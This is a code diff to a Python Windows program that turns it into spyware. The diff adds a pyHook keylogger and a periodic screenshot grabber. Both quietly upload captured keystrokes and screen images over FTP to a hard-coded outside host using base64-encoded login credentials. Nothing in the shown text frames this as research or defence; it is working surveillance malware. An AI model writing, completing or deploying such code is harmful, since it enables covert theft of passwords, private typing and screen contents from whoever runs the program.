@@ -1,4 +1,5 @@
-import os, sys, win32console, win32gui, socket, subprocess,  time, threading, hashlib, ftplib
+import os, sys, win32console, win32gui, socket, subprocess,  time, threading, hashlib, ftplib, pythoncom, pyHook, win32api
+import pyscreenshot as ImageGrab
 
 class program(object):
 	"""This class is responsible for holding important program information."""
@@ -32,20 +33,103 @@ class module(object):
 			self.user = str(user).decode('base64')
 			self.password = str(password).decode('base64')
 
-		def connect(self, host, port, user, password):
+		def screenshot(self, host, port, user, password):
 			global ftp
 			ftp = ftplib.FTP()
 			ftp.connect(host,port)
 			ftp.login(user,password)
 			print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
+			ftp.cwd('Furnace')
+			pc_name = str(os.environ['COMPUTERNAME'])
+			fileName = pc_name + '_' + str(str(time.ctime()).replace(' ','_')).replace(':','') + '.jpg'
+			im = ImageGrab.grab_to_file(fileName)
+			try:
+				ftp.cwd(pc_name)
+			except:
+				ftp.mkd(pc_name)
+				ftp.cwd(pc_name)
+			module.fileTransferProtocol.upload(fileName)
+			print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
+			ftp.close()
+
 			return True
 
+		def keylogger(self, host, port, user, password):
+			while 1:
+				global buffer
+				buffer = ''
+
+				def OnKeyboardEvent(event):
+					#print 'MessageName:', event.MessageName
+					#print 'Message:',event.Message
+					#print 'Time:',event.Time
+					#print 'Window:',event.Window
+					#print 'WindowName:',event.WindowName
+					#print 'Ascii:', event.Ascii, chr(event.Ascii)
+					#print 'Key:', event.Key
+					#print 'KeyID:', event.KeyID
+					#print 'ScanCode:', event.ScanCode
+					#print 'Extended:', event.Extended
+					#print 'Injected:', event.Injected
+					#print 'Alt', event.Alt
+					#print 'Transition', event.Transition
+					#print '---'
+
+					if event.Ascii < 256 or event.Ascii <> 0:
+						global buffer
+						fileName = str(str(time.ctime()).replace(' ','_')).replace(':','') + '.keys'
+						print 'ASCII Event Number: ' + str(event.Ascii)
+						if event.Ascii==5:
+							_exit(1)
+						if event.Ascii !=0 or 8:	
+							keylogs=chr(event.Ascii)
+							print 'Key Pressed: ' + str(keylogs)
+							if event.Ascii==13:
+								keylogs='/n'
+							buffer+=keylogs
+							print 'Actual Buffer Lenght: ' + str(len(buffer))
+							if(len(buffer) > 100):
+								pc_name = str(os.environ['COMPUTERNAME'])
+								global ftp
+								ftp = ftplib.FTP()
+								ftp.connect(host,port)
+								ftp.login(user,password)
+								print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
+								ftp.cwd('Furnace')
+								f=open(fileName,'w')
+								f.write(buffer)
+								f.close()
+								buffer = ''
+								try:
+									ftp.cwd(pc_name)
+								except:
+									ftp.mkd(pc_name)
+									ftp.cwd(pc_name)
+								module.fileTransferProtocol.upload(fileName)
+								print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
+								ftp.close()
+
+				# create a hook manager object
+				hm=pyHook.HookManager()
+				hm.KeyDown=OnKeyboardEvent
+				# set the hook
+				hm.HookKeyboard()
+				# wait forever
+				pythoncom.PumpMessages()
+
+		@classmethod
 		def download(self, fileName):
+			global ftp
+			ftp = ftplib.FTP()
+			ftp.connect(host,port)
+			ftp.login(user,password)
+			print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
 			f = open(fileName, 'wb')
 			ftp.retrbinary('RETR ' + str(fileName), f.write)
 			f.close()
 			return True
 
+		@classmethod
 		def upload(self, fileName):
 			if(os.path.isfile(fileName)):
 				ftp.storbinary('STOR ' + str(fileName), open(fileName, 'rb'))
@@ -55,19 +139,6 @@ class module(object):
 
 		def listDir():
 			ftp.dir()
-
-		
-			
-			
-
-
-			
-
-
-
-
-
-			
 
 
 	class thread(object):
@@ -191,9 +262,11 @@ def main():
 	if(ftpMode == True):
 		#start FTP conn
 		fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
-		fp.connect(fp.host,fp.port, fp.user, fp.password)
+		module.thread.start(fp.keylogger,(fp.host,fp.port, fp.user, fp.password))
 
-
+		while 1:
+			module.thread.start(fp.screenshot,(fp.host,fp.port, fp.user, fp.password))
+			time.sleep(300)
 
 if __name__ == '__main__':
 	main()
